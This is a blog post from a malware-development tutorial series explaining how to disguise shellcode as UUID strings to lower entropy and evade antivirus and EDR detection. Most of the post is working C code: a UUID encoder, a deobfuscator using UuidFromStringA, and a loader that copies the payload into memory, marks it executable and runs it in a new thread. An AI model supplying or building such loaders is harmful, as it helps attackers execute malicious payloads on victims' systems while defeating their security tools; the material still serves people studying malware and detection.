---
title: Maldev Series 3 | Payload Obfuscation
date: 2025-11-12 11:56:03 +0100
categories: [Maldev, Basic]
tags: [Maldev, Malware]
---

Hello, this is the third episode of the Maldev Series and today we're gonna talk about payload obfuscation. 

So we've gained a fundamental understanding of payload encryption. Obfuscation is another "tool" we can use to stay unpredictable.  

The obfuscation can be used to reduce the entropy of an encrypted payload to avoid detection. I'm gonna cover that at the end of this article.

Some of these techniques are being used in the wild, such as: [Hive ransomware](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)

We can obfuscate our shellcode with IPv4, IPv6, MAC, and the one I will cover here: UUID.  

** I strongly suggest you read the previous maldev episodes to understand everything, I will go fast on the shellcode execution, this is not the subject here **  

## Explanation of our plan

So we want to transform a blob of bytes into UUID addresses. We first need to see what a UUID looks like: ![Uuid format](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/uuid.png)

We're gonna use a technique that is not straightforward. For example: 
`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51` does not transform to:  
`FC4883E4-F0E8-C000-0000-415141505251`   
but to:  
`E48348FC-E8F0-00C0-0000-415141505251`  

The first 3 segments are converted in little-endian (bytes are reversed), so:

`FC 48 83 E4` -> `E4 83 48 FC`  
`F0 E8` -> `E8 F0`  
`C0 00` -> `00 C0`  

And the last 2 segments stay in big-endian (no reversal):   

`00 00` -> `00 00`  
`41 51 41 50 52 51` -> `41 51 41 50 52 51`


## Implementation

So here is the implementation: 

```c
const unsigned char shellcode[288] = {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
{... Your shellcode ...}
0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

char* GenerateUUid(int a, int b, int c, int d,
    int e, int f, int g, int h,
    int i, int j, int k, int l,
    int m, int n, int o, int p) {

    char* result = (char*)malloc(37);
    if (!result) return NULL;

    snprintf(result, 37,
        "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
        d, c, b, a,    /* seg1 little-endian reversed */
        f, e,          /* seg2 little-endian reversed */
        h, g,          /* seg3 little-endian reversed */
        i, j,          /* seg4 big-endian */
        k, l, m, n, o, p); /* seg5 big-endian */

    return result;
}

/* GenerateUuidOutput: minimal adjustments:
   - check ShellcodeSize == 0 (not == NULL)
   - iterate by blocks of 16
   - free UUIDs after printing (no leak) */
BOOL GenerateUuidOutput(const unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    if (pShellcode == NULL || ShellcodeSize == 0 || (ShellcodeSize % 16) != 0) {
        fprintf(stderr, "Invalid input: NULL pointer, zero size, or size not multiple of 16\n");
        return FALSE;
    }

    int blocks = (int)(ShellcodeSize / 16);
    printf("char* UuidArray[%d] = {\n\t", blocks);

    for (int i = 0; i < blocks; ++i) {
        const unsigned char* blk = pShellcode + i * 16;
        char* uuid = GenerateUUid(
            blk[0], blk[1], blk[2], blk[3],
            blk[4], blk[5], blk[6], blk[7],
            blk[8], blk[9], blk[10], blk[11],
            blk[12], blk[13], blk[14], blk[15]
        );
        if (!uuid) { fprintf(stderr, "malloc failed\n"); return FALSE; }

        if (i == blocks - 1) printf("\"%s\"\n", uuid);
        else {
            printf("\"%s\", ", uuid);
            if ((i + 1) % 3 == 0) printf("\n\t");
        }

        free(uuid);
    }

    printf("};\n\n");
    return TRUE;
}
```

Note: you will probably need to pad your shellcode, i.e., a NOP sled at the end (0x90) to have a multiple of 16.

And you can generate your obfuscated shellcode just like so: 

```c
int main() {
	GenerateUuidOutput((const unsigned char*)shellcode, sizeof(shellcode));
	return 0;
}
```

This will give you something like that: 
```c
char* UuidArray[18] = {
        "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", 
        {... Your Obfuscated shellcode ...}
        "00657865-9090-9090-9090-909090909090"
};
```


## The deobfuscation and execution

So this is the function to deobfuscate the payload: 

```c
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer = NULL,
	               TmpBuffer = NULL;

	SIZE_T         sBuffSize = 0;

	RPC_STATUS     STATUS = 0;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}
```

We use the function `pUuidFromStringA` to deobfuscate the payload.

And in the main we can use this to execute the payload: 

```c
int main() {
    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize = 0;

    printf("[i] Injecting shellcode into the local process of PID: %d \n", GetCurrentProcessId());

    printf("[i] Deobfuscating ...");
    if (!UuidDeobfuscation(UuidArray, sizeof(UuidArray) / sizeof(UuidArray[0]), &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
	memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

	DWORD dwOldProtection = 0;

	if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return -1;
	}

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
    

	if (!hThread) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return -1;
	}
    
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```


So with this we have successfully deobfuscated and executed the payload.


## Entropy

So I talked earlier about entropy. This matters because the entropy of certain sections of a PE can be analyzed and flagged as malicious. [Here's an explanation of why entropy is important in malware analysis](https://github.com/ericyoc/win_entropy_packing_poc)

So with a non-encrypted, non-obfuscated payload we have an entropy like this: 
![Entropy Basic](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/Entropy_msf_shellcode_basic.png)
Little higher than English text but not too alarming.

With an encrypted payload the entropy goes through the roof: 
![Entropy Basic](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/Entropy_msf_shellcode_encrypted.png)

But if the payload is encrypted and then obfuscated we have a much nicer entropy: 
![Entropy Basic](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/Entropy_msf_shellcode_encrypted_obf.png)

So with that we can escape one of the numerous counter-measures of the EDR/AVs.

You can find the files here: 

[UUID obfuscation](https://github.com/WinDyAlphA/maldevSamples/blob/main/obfuscation/obfuscation/UUID.c)

[UUID deobfuscation and execution](https://github.com/WinDyAlphA/maldevSamples/blob/main/obfuscation/deobfuscation/basicUUID.c)

Thanks for reading and see you next time !